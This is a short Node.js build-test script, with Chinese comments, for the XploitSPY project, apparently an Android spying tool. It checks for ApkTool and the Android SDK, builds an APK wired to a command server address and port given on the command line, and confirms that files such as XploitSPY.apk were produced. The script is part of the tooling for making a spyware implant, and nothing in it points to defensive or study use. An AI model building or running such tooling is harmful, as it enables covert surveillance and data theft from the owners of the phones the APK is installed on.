#!/usr/bin/env node
/**
 * 构建测试脚本 - 用于验证 APK 构建流程
 * 使用方法: node test-build.js <URI> <PORT>
 * 示例: node test-build.js 192.168.1.100 8080
 */

const path = require('path');
const fs = require('fs');

// 加载模块
const apkBuilder = require('./server/includes/apkBuilder');

console.log('=====================================');
console.log('XploitSPY APK 构建测试脚本');
console.log('=====================================');

// 获取参数
const URI = process.argv[2] || '127.0.0.1';
const PORT = process.argv[3] || '8080';

console.log(`\n测试参数:`);
console.log(`  URI: ${URI}`);
console.log(`  PORT: ${PORT}`);

// 检查环境
console.log('\n环境检查:');
console.log(`  ApkTool存在: ${apkBuilder.canUseApkTool() ? '是' : '否'}`);
console.log(`  Android SDK: ${apkBuilder.getAndroidSdkPath() || '未找到'}`);

// 执行构建
console.log('\n开始构建测试...\n');

apkBuilder.buildAPK(URI, PORT, (error) => {
    if (error) {
        console.error('\n❌ 构建失败:', error);
        process.exit(1);
    } else {
        console.log('\n✅ 构建成功!');
        
        // 检查输出文件
        const CONST = require('./server/includes/const');
        const outputFiles = [
            path.join(CONST.apkOutputPath, 'XploitSPY.apk'),
            path.join(CONST.apkOutputPath, 'build-aligned-signed.apk'),
            CONST.apkSignedBuildPath
        ];
        
        console.log('\n输出文件检查:');
        let found = false;
        for (const file of outputFiles) {
            if (fs.existsSync(file)) {
                const stats = fs.statSync(file);
                console.log(`  ✅ ${path.basename(file)}: ${stats.size} 字节`);
                found = true;
            }
        }
        
        if (!found) {
            console.log('  ⚠️ 未找到标准输出文件，请检查目录:', CONST.apkOutputPath);
        }
        
        process.exit(0);
    }
});
